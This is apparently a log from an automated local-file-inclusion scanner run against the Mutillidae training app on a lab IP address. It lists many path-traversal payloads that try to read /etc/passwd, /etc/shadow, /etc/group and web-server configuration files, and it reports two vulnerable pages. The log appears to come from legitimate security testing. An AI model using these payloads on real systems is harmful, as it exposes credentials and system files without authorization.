INFO - 
Starting ScanLocalFileInclusion scan
INFO - 	No forms found on http://192.168.232.129/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
INFO - 	Testing payload: etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
WARNING - Local file inclusion vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php with payload: /etc/passwd
INFO - 	Testing payload: etc/passwd on http://192.168.232.129/mutillidae/index.php?page=source-viewer.php
INFO - 	Testing payload: /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=source-viewer.php
WARNING - Local file inclusion vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=source-viewer.php with payload: /etc/passwd
INFO - 	Testing payload: etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/passwd on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/group on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/shadow on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/hostname on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/apache2/apache2.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ///etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ////etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: /////etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: //////etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ./etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ../../../../../../../../../../../../../../../../etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:///etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: file:\\\\\\etc/nginx/nginx.conf on http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	No local file inclusion vulnerability found in forms at: http://192.168.232.129/mutillidae/index.php?page=dns-lookup.php
INFO - 	Testing payload: etc/passwd on http://192.168.232.129/mutillidae/index.php as http://192.168.232.129/mutillidae/index.php?page=etc%2Fpasswd
INFO - 	Testing payload: /etc/passwd on http://192.168.232.129/mutillidae/index.php as http://192.168.232.129/mutillidae/index.php?page=%2Fetc%2Fpasswd
